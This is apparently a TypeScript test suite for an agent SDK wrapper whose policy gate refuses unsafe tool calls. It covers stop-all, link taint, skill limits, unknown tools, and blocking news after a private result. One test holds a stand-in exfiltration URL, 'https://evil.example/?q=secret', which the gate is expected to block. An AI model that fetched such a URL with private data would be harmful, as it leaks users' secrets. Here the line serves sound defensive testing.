import { test } from "node:test";
import assert from "node:assert/strict";
import { authMode, gated, serial, nativeSystem, orbitName, readMessage, sdkName, sdkOptions, stepLine, toolResult, SDK_TOOLS } from "../src/lib/core-sdk-pure.ts";
import { TIERS, type PolicyCtx } from "../src/lib/policy-pure.ts";

const base = (o: Partial<PolicyCtx> = {}) => () => ({ stopAll: false, attach: false, pins: false, question: "news about estonia", ...o });

test("tool names round-trip through the SDK's mcp__orbit__ prefix; built-ins and other servers aren't ours", () => {
  assert.equal(sdkName("fetch_url"), "mcp__orbit__fetch_url");
  assert.equal(orbitName("mcp__orbit__read_news"), "read_news");
  assert.equal(orbitName("Bash"), null);
  assert.equal(orbitName("mcp__other__read_news"), null);
});

test("the prototype's tools are all read-only (T0/T1)", () => {
  for (const t of SDK_TOOLS) assert.match(TIERS[t], /^T[01]$/, t);
});

test("tool results: Error: text becomes isError, long output is capped like core.ts", () => {
  assert.deepEqual(toolResult("Error: nope"), { content: [{ type: "text", text: "Error: nope" }], isError: true });
  assert.equal(toolResult("x".repeat(9000)).content[0].text.length, 8000);
  assert.equal(toolResult("ok").isError, false);
});

test("gated: an allowed call runs and is recorded in core.ts's step format", async () => {
  const steps: string[] = [];
  const r = await gated("read_news", { query: "estonia" }, base(), steps, async () => "headlines");
  assert.equal(r.out, "headlines");
  assert.equal(r.verdict.allow, true);
  assert.deepEqual(steps, [stepLine("read_news", { query: "estonia" }, "headlines")]);
  assert.match(steps[0], /^You called read_news \{"query":"estonia"\}\nRESULT:\nheadlines$/);
});

test("gated: decide() refusals never run the tool (Stop-all, link taint, skill limits, unknown tools)", async () => {
  let ran = 0;
  const run = async () => { ran++; return "ran"; };
  const steps: string[] = [];
  assert.match((await gated("ask_agent", { agent: "atlas", request: "x" }, base({ stopAll: true }), steps, run)).out, /^Error: /);
  // pinned notes in context: only links the user typed may be opened
  assert.match((await gated("fetch_url", { url: "https://evil.example/?q=secret" }, base({ pins: true }), steps, run)).out, /^Error: /);
  assert.match((await gated("read_news", { query: "x" }, base(), steps, run, "[SKILL demo · tools: fetch_url]\n")).out, /this skill may only use fetch_url/);
  assert.match((await gated("Bash", {}, base(), steps, run)).out, /unknown tool/);
  assert.equal(ran, 0);
  assert.equal(steps.length, 4); // refusals are still steps, as in core.ts
});

test("gated: earlier steps feed decide(): a private tool result turns news off for the rest of the turn", async () => {
  const steps = [stepLine("week_review", {}, "private")];
  assert.match((await gated("read_news", { query: "x" }, base(), steps, async () => "ran")).out, /private files/);
});

test("gated: a thrown tool error becomes an Error: result", async () => {
  const r = await gated("goal_status", {}, base(), [], async () => { throw new Error("db down"); });
  assert.equal(r.out, "Error: db down");
});

test("nativeSystem swaps the JSON envelope for native tool calls and keeps the rest", () => {
  const sys = 'Rules:\n- a\n\nHOW YOU ANSWER — reply with exactly ONE JSON object\n{"final": "x"}\n\nTOOLS:\n- web_search {}: y\n\nUser profile';
  const out = nativeSystem(sys);
  assert.doesNotMatch(out, /JSON object/);
  assert.match(out, /^Rules:\n- a\n\nHOW YOU ANSWER: write the answer in Markdown/);
  assert.match(out, /TOOL NOTES:\n- web_search \{\}: y\n\nUser profile$/);
});

test("sdkOptions: no built-in tools, no settings from disk, only our server, deny anything not pre-approved", () => {
  const o = sdkOptions({ model: "sonnet", system: "s", server: { x: 1 }, maxTurns: 8, cwd: "/tmp/x" });
  assert.deepEqual(o.tools, []);
  assert.deepEqual(o.settingSources, []);
  assert.equal(o.strictMcpConfig, true);
  assert.deepEqual(Object.keys(o.mcpServers), ["orbit"]);
  assert.equal(o.permissionMode, "dontAsk");
  assert.deepEqual(o.allowedTools, SDK_TOOLS.map(sdkName));
  assert.equal(o.persistSession, false);
  assert.equal("effort" in o, false);
  assert.equal(sdkOptions({ model: "opus", system: "s", server: {}, maxTurns: 8, cwd: "/", effort: "high" }).effort, "high");
});

test("readMessage: top-level text deltas stream; subagent deltas and other events don't", () => {
  const ev = (text: string, parent: string | null = null) => ({ type: "stream_event", parent_tool_use_id: parent, event: { type: "content_block_delta", delta: { type: "text_delta", text } } });
  assert.deepEqual(readMessage(ev("Hi")), { delta: "Hi" });
  assert.equal(readMessage(ev("x", "toolu_1")), null);
  assert.equal(readMessage({ type: "stream_event", event: { type: "content_block_delta", delta: { type: "input_json_delta" } } }), null);
  assert.equal(readMessage({ type: "assistant" }), null);
});

test("readMessage: init names the auth source; result maps to the CLI path's StreamResult", () => {
  assert.deepEqual(readMessage({ type: "system", subtype: "init", apiKeySource: "none", model: "claude-sonnet", session_id: "s1" }), { init: { apiKeySource: "none", model: "claude-sonnet", sessionId: "s1" } });
  assert.equal(authMode("none"), "subscription login");
  assert.equal(authMode("ANTHROPIC_API_KEY"), "API key (ANTHROPIC_API_KEY)");
  const ok = readMessage({ type: "result", subtype: "success", is_error: false, result: "Answer", num_turns: 3, total_cost_usd: 0.02, usage: { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 900, cache_creation_input_tokens: 100 } });
  assert.deepEqual(ok, { result: { text: "Answer", isError: false, errors: [], inputTokens: 10, outputTokens: 5, cacheWrite: 100, cacheRead: 900, turns: 3, costUsd: 0.02 } });
  const bad = readMessage({ type: "result", subtype: "error_max_turns", is_error: true, errors: ["hit 8"] })!.result!;
  assert.equal(bad.isError, true);
  assert.deepEqual(bad.errors, ["error_max_turns", "hit 8"]);
  assert.equal(bad.text, "");
});

test("serial: parallel tool calls run one at a time, so each decide() sees the earlier results", async () => {
  const one = serial();
  const order: string[] = [];
  const slow = (name: string, ms: number) => one(async () => { order.push(`start ${name}`); await new Promise((r) => setTimeout(r, ms)); order.push(`end ${name}`); return name; });
  const failing = one(async () => { throw new Error("x"); });
  assert.deepEqual(await Promise.all([slow("a", 20), slow("b", 1), failing.catch(() => "failed")]), ["a", "b", "failed"]);
  assert.deepEqual(order, ["start a", "end a", "start b", "end b"]);
  assert.equal(await one(async () => "after a failure"), "after a failure");
});
